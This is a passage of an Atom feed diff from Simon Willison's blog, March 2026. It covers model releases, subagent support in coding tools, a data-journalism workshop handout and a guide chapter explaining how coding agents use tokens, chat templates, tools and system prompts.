+&lt;li&gt;&lt;a href="https://developers.openai.com/codex/subagents/"&gt;OpenAI Codex subagents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://code.claude.com/docs/en/sub-agents"&gt;Claude subagents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://geminicli.com/docs/core/subagents/"&gt;Gemini CLI subagents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://docs.mistral.ai/mistral-vibe/agents-skills#agent-selection"&gt;Mistral Vibe subagents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://opencode.ai/docs/agents/"&gt;OpenCode agents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://code.visualstudio.com/docs/copilot/agents/subagents"&gt;Subagents in Visual Studio Code&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://cursor.com/docs/subagents"&gt;Cursor Subagents&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/parallel-agents"&gt;parallel-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/agentic-engineering"&gt;agentic-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="parallel-agents"/><category term="coding-agents"/><category term="generative-ai"/><category term="agentic-engineering"/><category term="ai"/><category term="llms"/></entry><entry><title>Introducing Mistral Small 4</title><link href="https://simonwillison.net/2026/Mar/16/mistral-small-4/#atom-everything" rel="alternate"/><published>2026-03-16T23:41:17+00:00</published><updated>2026-03-16T23:41:17+00:00</updated><id>https://simonwillison.net/2026/Mar/16/mistral-small-4/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://mistral.ai/news/mistral-small-4"&gt;Introducing Mistral Small 4&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Big new release from Mistral today (despite the name) - a new Apache 2 licensed 119B parameter (Mixture-of-Experts, 6B active) model which they describe like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Mistral Small 4 is the first Mistral model to unify the capabilities of our flagship models, Magistral for reasoning, Pixtral for multimodal, and Devstral for agentic coding, into a single, versatile model.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It supports &lt;code&gt;reasoning_effort="none"&lt;/code&gt; or &lt;code&gt;reasoning_effort="high"&lt;/code&gt;, with the latter providing "equivalent verbosity to previous Magistral models". &lt;/p&gt;
+&lt;p&gt;The new model is &lt;a href="https://huggingface.co/mistralai/Mistral-Small-4-119B-2603/tree/main"&gt;242GB on Hugging Face&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I &lt;a href="https://gist.github.com/simonw/3dec228577559f15f26204a3cc550583"&gt;tried it out&lt;/a&gt; via the Mistral API using &lt;a href="https://github.com/simonw/llm-mistral"&gt;llm-mistral&lt;/a&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;llm install llm-mistral
+llm mistral refresh
+llm -m mistral/mistral-small-2603 "Generate an SVG of a pelican riding a bicycle"
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img alt="The bicycle is upside down and mangled and the pelican is a series of grey curves with a triangular beak." src="https://static.simonwillison.net/static/2026/mistral-small-4.png" /&gt;&lt;/p&gt;
+&lt;p&gt;I couldn't find a way to set the reasoning effort in their &lt;a href="https://docs.mistral.ai/api/endpoint/chat#operation-chat_completion_v1_chat_completions_post"&gt;API documentation&lt;/a&gt;, so hopefully that's a feature which will land soon.&lt;/p&gt;
+&lt;p&gt;Also from Mistral today and fitting their -stral naming convention is &lt;a href="https://mistral.ai/news/leanstral"&gt;Leanstral&lt;/a&gt;, an open weight model that is specifically tuned to help output the &lt;a href="https://lean-lang.org/"&gt;Lean 4&lt;/a&gt; formally verifiable coding language. I haven't explored Lean at all so I have no way to credibly evaluate this, but it's interesting to see them target one specific language in this way.
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm"&gt;llm&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/mistral"&gt;mistral&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pelican-riding-a-bicycle"&gt;pelican-riding-a-bicycle&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-reasoning"&gt;llm-reasoning&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-release"&gt;llm-release&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="llm"/><category term="mistral"/><category term="pelican-riding-a-bicycle"/><category term="llm-reasoning"/><category term="llm-release"/></entry><entry><title>Use subagents and custom agents in Codex</title><link href="https://simonwillison.net/2026/Mar/16/codex-subagents/#atom-everything" rel="alternate"/><published>2026-03-16T23:03:56+00:00</published><updated>2026-03-16T23:03:56+00:00</updated><id>https://simonwillison.net/2026/Mar/16/codex-subagents/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://developers.openai.com/codex/subagents"&gt;Use subagents and custom agents in Codex&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Subagents were announced in general availability today for OpenAI Codex, after several weeks of preview behind a feature flag.&lt;/p&gt;
+&lt;p&gt;They're very similar to the Claude Code implementation, with default subagents for "explorer", "worker" and "default". It's unclear to me what the difference between "worker" and "default" is but based on their CSV example I think "worker" is intended for running large numbers of small tasks in parallel.&lt;/p&gt;
+&lt;p&gt;Codex also lets you define custom agents as TOML files in &lt;code&gt;~/.codex/agents/&lt;/code&gt;. These can have custom instructions and be assigned to use specific models - including &lt;code&gt;gpt-5.3-codex-spark&lt;/code&gt; if you want &lt;a href="https://simonwillison.net/2026/Feb/12/codex-spark/"&gt;some raw speed&lt;/a&gt;. They can then be referenced by name, as demonstrated by this example prompt from the documentation:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Investigate why the settings modal fails to save. Have browser_debugger reproduce it, code_mapper trace the responsible code path, and ui_fixer implement the smallest fix once the failure mode is clear.&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The subagents pattern is widely supported in coding agents now. Here's documentation across a number of different platforms:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://developers.openai.com/codex/subagents/"&gt;OpenAI Codex subagents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://code.claude.com/docs/en/sub-agents"&gt;Claude Code subagents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://geminicli.com/docs/core/subagents/"&gt;Gemini CLI subagents&lt;/a&gt; (experimental)&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://docs.mistral.ai/mistral-vibe/agents-skills#agent-selection"&gt;Mistral Vibe subagents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://opencode.ai/docs/agents/"&gt;OpenCode agents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://code.visualstudio.com/docs/copilot/agents/subagents"&gt;Subagents in Visual Studio Code&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://cursor.com/docs/subagents"&gt;Cursor Subagents&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: I added &lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/subagents/"&gt;a chapter on Subagents&lt;/a&gt; to my Agentic Engineering Patterns guide.
+
+    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://twitter.com/OpenAIDevs/status/2033636701848174967"&gt;@OpenAIDevs&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/parallel-agents"&gt;parallel-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/agentic-engineering"&gt;agentic-engineering&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai"/><category term="openai"/><category term="generative-ai"/><category term="llms"/><category term="coding-agents"/><category term="codex-cli"/><category term="parallel-agents"/><category term="agentic-engineering"/></entry><entry><title>Quoting A member of Anthropic’s alignment-science team</title><link href="https://simonwillison.net/2026/Mar/16/blackmail/#atom-everything" rel="alternate"/><published>2026-03-16T21:38:55+00:00</published><updated>2026-03-16T21:38:55+00:00</updated><id>https://simonwillison.net/2026/Mar/16/blackmail/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://www.newyorker.com/news/annals-of-inquiry/the-pentagon-went-to-war-with-anthropic-whats-really-at-stake?_sp=9a6e0ff7-2bfd-46f8-a9e1-3941ef2003b5.1773495048769"&gt;&lt;p&gt;The point of &lt;a href="https://simonwillison.net/2025/Jun/20/agentic-misalignment/"&gt;the blackmail exercise&lt;/a&gt; was to have something to describe to policymakers—results that are visceral enough to land with people, and make misalignment risk actually salient in practice for people who had never thought about it before.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://www.newyorker.com/news/annals-of-inquiry/the-pentagon-went-to-war-with-anthropic-whats-really-at-stake?_sp=9a6e0ff7-2bfd-46f8-a9e1-3941ef2003b5.1773495048769"&gt;A member of Anthropic’s alignment-science team&lt;/a&gt;, as told to Gideon Lewis-Kraus&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/anthropic"&gt;anthropic&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude"&gt;claude&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai-ethics"/><category term="anthropic"/><category term="claude"/><category term="generative-ai"/><category term="ai"/><category term="llms"/></entry><entry><title>Quoting Guilherme Rambo</title><link href="https://simonwillison.net/2026/Mar/16/guilherme-rambo/#atom-everything" rel="alternate"/><published>2026-03-16T20:34:13+00:00</published><updated>2026-03-16T20:34:13+00:00</updated><id>https://simonwillison.net/2026/Mar/16/guilherme-rambo/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://daringfireball.net/2026/03/apple_enclaves_neo_camera_indicator"&gt;&lt;p&gt;Tidbit: the software-based camera indicator light in the MacBook Neo runs in the secure exclave¹ part of the chip, so it is almost as secure as the hardware indicator light. What that means in practice is that even a kernel-level exploit would not be able to turn on the camera without the light appearing on screen. It runs in a privileged environment separate from the kernel and blits the light directly onto the screen hardware.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://daringfireball.net/2026/03/apple_enclaves_neo_camera_indicator"&gt;Guilherme Rambo&lt;/a&gt;, in a text message to John Gruber&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/hardware"&gt;hardware&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/apple"&gt;apple&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/privacy"&gt;privacy&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/john-gruber"&gt;john-gruber&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="hardware"/><category term="apple"/><category term="privacy"/><category term="john-gruber"/></entry><entry><title>Coding agents for data analysis</title><link href="https://simonwillison.net/2026/Mar/16/coding-agents-for-data-analysis/#atom-everything" rel="alternate"/><published>2026-03-16T20:12:32+00:00</published><updated>2026-03-16T20:12:32+00:00</updated><id>https://simonwillison.net/2026/Mar/16/coding-agents-for-data-analysis/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/"&gt;Coding agents for data analysis&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Here's the handout I prepared for my NICAR 2026 workshop "Coding agents for data analysis" - a three hour session aimed at data journalists demonstrating ways that tools like Claude Code and OpenAI Codex can be used to explore, analyze and clean data.&lt;/p&gt;
+&lt;p&gt;Here's the table of contents:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/coding-agents.html"&gt;Coding agents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/warmup.html"&gt;Warmup: ChatGPT and Claude&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/setup.html"&gt;Setup Claude Code and Codex&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/asking-questions.html"&gt;Asking questions against a database&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/exploring-data.html"&gt;Exploring data with agents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/cleaning-trees.html"&gt;Cleaning data: decoding neighborhood codes&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/visualizations.html"&gt;Creating visualizations with agents&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/scraping.html"&gt;Scraping data with agents&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I ran the workshop using GitHub Codespaces and OpenAI Codex, since it was easy (and inexpensive) to distribute a budget-restricted API key for Codex that attendees could use during the class. Participants ended up burning $23 of Codex tokens.&lt;/p&gt;
+&lt;p&gt;The exercises all used Python and SQLite and some of them used Datasette.&lt;/p&gt;
+&lt;p&gt;One highlight of the workshop was when we started &lt;a href="https://simonw.github.io/nicar-2026-coding-agents/visualizations.html#javascript-visualizations"&gt;running Datasette&lt;/a&gt; such that it served static content from a &lt;code&gt;viz/&lt;/code&gt; folder, then had Claude Code start vibe coding new interactive visualizations directly in that folder. Here's a heat map it created for my trees database using Leaflet and &lt;a href="https://github.com/Leaflet/Leaflet.heat"&gt;Leaflet.heat&lt;/a&gt;, &lt;a href="https://gist.github.com/simonw/985ae2a6a3cd3df3fd375eb58dabea0f"&gt;source code here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Screenshot of a &amp;quot;Trees SQL Map&amp;quot; web application with the heading &amp;quot;Trees SQL Map&amp;quot; and subheading &amp;quot;Run a query and render all returned points as a heat map. The default query targets roughly 200,000 trees.&amp;quot; Below is an input field containing &amp;quot;/trees/-/query.json&amp;quot;, a &amp;quot;Run Query&amp;quot; button, and a SQL query editor with the text &amp;quot;SELECT cast(Latitude AS float) AS latitude, cast(Longitude AS float) AS longitude, CASE WHEN DBH IS NULL OR DBH = '' THEN 0.3 WHEN cast(DBH AS float) &amp;lt;= 0 THEN 0.3 WHEN cast(DBH AS float) &amp;gt;= 80 THEN 1.0&amp;quot; (query is truncated). A status message reads &amp;quot;Loaded 1,000 rows and plotted 1,000 points as heat map.&amp;quot; Below is a Leaflet/OpenStreetMap interactive map of San Francisco showing a heat map overlay of tree locations, with blue/green clusters concentrated in areas like the Richmond District, Sunset District, and other neighborhoods. Map includes zoom controls and a &amp;quot;Leaflet | © OpenStreetMap contributors&amp;quot; attribution." src="https://static.simonwillison.net/static/2026/tree-sql-map.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;I designed the handout to also be useful for people who weren't able to attend the session in person. As is usually the case, material aimed at data journalists is equally applicable to anyone else with data to explore.
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/data-journalism"&gt;data-journalism&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/geospatial"&gt;geospatial&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/speaking"&gt;speaking&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sqlite"&gt;sqlite&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/datasette"&gt;datasette&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/github-codespaces"&gt;github-codespaces&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/nicar"&gt;nicar&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/leaflet"&gt;leaflet&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="data-journalism"/><category term="geospatial"/><category term="python"/><category term="speaking"/><category term="sqlite"/><category term="ai"/><category term="datasette"/><category term="generative-ai"/><category term="llms"/><category term="github-codespaces"/><category term="nicar"/><category term="coding-agents"/><category term="claude-code"/><category term="codex-cli"/><category term="leaflet"/></entry><entry><title>How coding agents work</title><link href="https://simonwillison.net/guides/agentic-engineering-patterns/how-coding-agents-work/#atom-everything" rel="alternate"/><published>2026-03-16T14:01:41+00:00</published><updated>2026-03-16T14:01:41+00:00</updated><id>https://simonwillison.net/guides/agentic-engineering-patterns/how-coding-agents-work/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;em&gt;&lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/"&gt;Agentic Engineering Patterns&lt;/a&gt; &amp;gt;&lt;/em&gt;&lt;/p&gt;
+    &lt;p&gt;As with any tool, understanding how &lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/what-is-agentic-engineering/"&gt;coding agents&lt;/a&gt; work under the hood can help you make better decisions about how to apply them.&lt;/p&gt;
+&lt;p&gt;A coding agent is a piece of software that acts as a &lt;strong&gt;harness&lt;/strong&gt; for an LLM, extending that LLM with additional capabilities that are powered by invisible prompts and implemented as callable tools.&lt;/p&gt;
+&lt;h2 id="large-language-models"&gt;Large Language Models&lt;/h2&gt;
+&lt;p&gt;At the heart of any coding agent is a Large Language Model, or LLM. These have names like GPT-5.4 or Claude Opus 4.6 or Gemini 3.1 Pro or Qwen3.5-35B-A3B.&lt;/p&gt;
+&lt;p&gt;An LLM is a machine learning model that can complete a sentence of text. Give the model the phrase "the cat sat on the " and it will (almost certainly) suggest "mat" as the next word in the sentence.&lt;/p&gt;
+&lt;p&gt;As these models get larger and train on increasing amounts of data, they can complete more complex sentences - like "a python function to download a file from a URL is def download_file(url): ".&lt;/p&gt;
+&lt;p&gt;LLMs don't actually work directly with words - they work with tokens. A sequence of text is converted into a sequence of integer tokens, so "the cat sat on the " becomes &lt;code&gt;[3086, 9059, 10139, 402, 290, 220]&lt;/code&gt;. This is worth understanding because LLM providers charge based on the number of tokens processed, and are limited in how many tokens they can consider at a time.&lt;/p&gt;
+&lt;p&gt;You can experiment with the OpenAI tokenizer to see how this works at &lt;a href="https://platform.openai.com/tokenizer"&gt;platform.openai.com/tokenizer&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The input to an LLM is called the &lt;strong&gt;prompt&lt;/strong&gt;. The text returned by an LLM is called the &lt;strong&gt;completion&lt;/strong&gt;, or sometimes the &lt;strong&gt;response&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Many models today are &lt;strong&gt;multimodal&lt;/strong&gt;, which means they can accept more than just text as input.  &lt;strong&gt;Vision LLMs&lt;/strong&gt; (vLLMs) can accept images as part of the input, which means you can feed them sketches or photos or screenshots. A common misconception is that these are run through a separate process for OCR or image analysis, but these inputs are actually turned into yet more token integers which are processed in the same way as text.&lt;/p&gt;
+&lt;h2 id="chat-templated-prompts"&gt;Chat templated prompts&lt;/h2&gt;
+&lt;p&gt;The first LLMs worked as completion engines - users were expected to provide a prompt which could then be completed by the model, such as the two examples shown above.&lt;/p&gt;
+&lt;p&gt;This wasn't particularly user-friendly so models mostly switched to using &lt;strong&gt;chat templated prompts&lt;/strong&gt; instead, which represent communication with the model as a simulated conversation.&lt;/p&gt;
+&lt;p&gt;This is actually just a form of completion prompt with a special format that looks something like this.&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;user: write a python function to download a file from a URL
+assistant:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The natural completion for this prompt is for the assistant (represented by the LLM) to answer the user's question with some Python code.&lt;/p&gt;
+&lt;p&gt;LLMs are stateless: every time they execute a prompt they start from the same blank slate. &lt;/p&gt;
+&lt;p&gt;To maintain the simulation of a conversation, the software that talks to the model needs to maintain its own state and replay the entire existing conversation every time the user enters a new chat prompt:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;user: write a python function to download a file from a URL
+assistant: def download_url(url):
+    return urllib.request.urlopen(url).read()
+user: use the requests library instead
+assistant:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Since providers charge for both input and output tokens, this means that as a conversation gets longer, each prompt becomes more expensive since the number of input tokens grows every time.&lt;/p&gt;
+&lt;h2 id="token-caching"&gt;Token caching&lt;/h2&gt;
+&lt;p&gt;Most model providers offset this somewhat through a cheaper rate for &lt;strong&gt;cached input tokens&lt;/strong&gt; - common token prefixes that have been processed within a short time period can be charged at a lower rate as the underlying infrastructure can cache and then reuse many of the expensive calculations used to process that input.&lt;/p&gt;
+&lt;p&gt;Coding agents are designed with this optimization in mind - they avoid modifying earlier conversation content to ensure the cache is used as efficiently as possible.&lt;/p&gt;
+&lt;h2 id="calling-tools"&gt;Calling tools&lt;/h2&gt;
+&lt;p&gt;The defining feature of an LLM &lt;strong&gt;agent&lt;/strong&gt; is that agents can call &lt;strong&gt;tools&lt;/strong&gt;. But what is a tool?&lt;/p&gt;
+&lt;p&gt;A tool is a function that the agent harness makes available to the LLM.&lt;/p&gt;
+&lt;p&gt;At the level of the prompt itself, that looks something like this:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;system: If you need to access the weather, end your turn with &amp;lt;tool&amp;gt;get_weather(city_name)&amp;lt;/tool&amp;gt;
+user: what&amp;#39;s the weather in San Francisco?
+assistant:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Here the assistant might respond with the following text:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;tool&amp;gt;get_weather(&amp;quot;San Francisco&amp;quot;)&amp;lt;/tool&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The model harness software then extracts that function call request from the response - probably with a regular expression - and executes the tool.&lt;/p&gt;
+&lt;p&gt;It then returns the result to the model, with a constructed prompt that looks something like this:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;system: If you need to access the weather, end your turn with &amp;lt;tool&amp;gt;get_weather(city_name)&amp;lt;/tool&amp;gt;
+user: what&amp;#39;s the weather in San Francisco?
+assistant: &amp;lt;tool&amp;gt;get_weather(&amp;quot;San Francisco&amp;quot;)&amp;lt;/tool&amp;gt;
+user: &amp;lt;tool-result&amp;gt;61°, Partly cloudy&amp;lt;/tool-result&amp;gt;
+assistant:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The LLM can now use that tool result to help generate an answer to the user's question.&lt;/p&gt;
+&lt;p&gt;Most coding agents define a dozen or more tools for the agent to call. The most powerful of these allow for code execution - a &lt;code&gt;Bash()&lt;/code&gt; tool for executing terminal commands, or a &lt;code&gt;Python()&lt;/code&gt; tool for running Python code, for example.&lt;/p&gt;
+&lt;h2 id="the-system-prompt"&gt;The system prompt&lt;/h2&gt;
+&lt;p&gt;In the previous example I included an initial message marked "system" which informed the LLM about the available tool and how to call it.&lt;/p&gt;
+&lt;p&gt;Coding agents usually start every conversation with a system prompt like this, which is not shown to the user but provides instructions telling the model how it should behave.&lt;/p&gt;
+&lt;p&gt;These system prompts can be hundreds of lines long. Here's &lt;a href="https://github.com/openai/codex/blob/rust-v0.114.0/codex-rs/core/templates/model_instructions/gpt-5.2-codex_instructions_template.md"&gt;the system prompt for OpenAI Codex&lt;/a&gt; as-of March 2026, which is a useful clear example of the kind of instructions that make these coding agents work.&lt;/p&gt;
+&lt;h2 id="reasoning"&gt;Reasoning&lt;/h2&gt;
+&lt;p&gt;One of the big new advances in 2025 was the introduction of &lt;strong&gt;reasoning&lt;/strong&gt; to the frontier model families.&lt;/p&gt;
+&lt;p&gt;Reasoning, sometimes presented as &lt;strong&gt;thinking&lt;/strong&gt; in the UI, is when a model spends additional time generating text that talks through the problem and its potential solutions before presenting a reply to the user.&lt;/p&gt;
+&lt;p&gt;This can look similar to a person thinking out loud, and has a similar effect. Crucially it allows models to spend more time (and more tokens) working on a problem in order to hopefully get a better result.&lt;/p&gt;
+&lt;p&gt;Reasoning is particularly useful for debugging issues in code as it gives the model an opportunity to navigate more complex code paths, mixing in tool calls and using the reasoning phase to follow function calls back to the potential source of an issue.&lt;/p&gt;
+&lt;p&gt;Many coding agents include options for dialing up or down the reasoning effort level, encouraging models to spend more time chewing on harder problems.&lt;/p&gt;
+&lt;h2 id="llm-system-prompt-tools-in-a-loop"&gt;LLM + system prompt + tools in a loop&lt;/h2&gt;
+&lt;p&gt;Believe it or not, that's most of what it takes to build a coding agent!&lt;/p&gt;
+&lt;p&gt;If you want to develop a deeper understanding of how these things work, a useful exercise is to try building your own agent from scratch. A simple tool loop can be achieved with a few dozen lines of code on top of an existing LLM API.&lt;/p&gt;
+&lt;p&gt;A &lt;em&gt;good&lt;/em&gt; tool loop is a great deal more work than that, but the fundamental mechanics are surprisingly straightforward.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/agentic-engineering"&gt;agentic-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="coding-agents"/><category term="generative-ai"/><category term="agentic-engineering"/><category term="ai"/><category term="llms"/></entry><entry><title>John M. Mossman Lock Collection</title><link href="https://simonwillison.net/2026/Mar/15/john-m-mossman-lock-collection/#atom-everything" rel="alternate"/><published>2026-03-15T23:38:05+00:00</published><updated>2026-03-15T23:38:05+00:00</updated><id>https://simonwillison.net/2026/Mar/15/john-m-mossman-lock-collection/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Museum:&lt;/strong&gt; &lt;a href="https://www.niche-museums.com/118"&gt;John M. Mossman Lock Collection&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;The General Society of Mechanics and Tradesmen of the City of New York is home to the John M. Mossman Lock Collection, likely the world's largest collection of antique bank locks.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/museums"&gt;museums&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="museums"/></entry><entry><title>What is agentic engineering?</title><link href="https://simonwillison.net/guides/agentic-engineering-patterns/what-is-agentic-engineering/#atom-everything" rel="alternate"/><published>2026-03-15T22:41:57+00:00</published><updated>2026-03-15T22:41:57+00:00</updated><id>https://simonwillison.net/guides/agentic-engineering-patterns/what-is-agentic-engineering/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;em&gt;&lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/"&gt;Agentic Engineering Patterns&lt;/a&gt; &amp;gt;&lt;/em&gt;&lt;/p&gt;
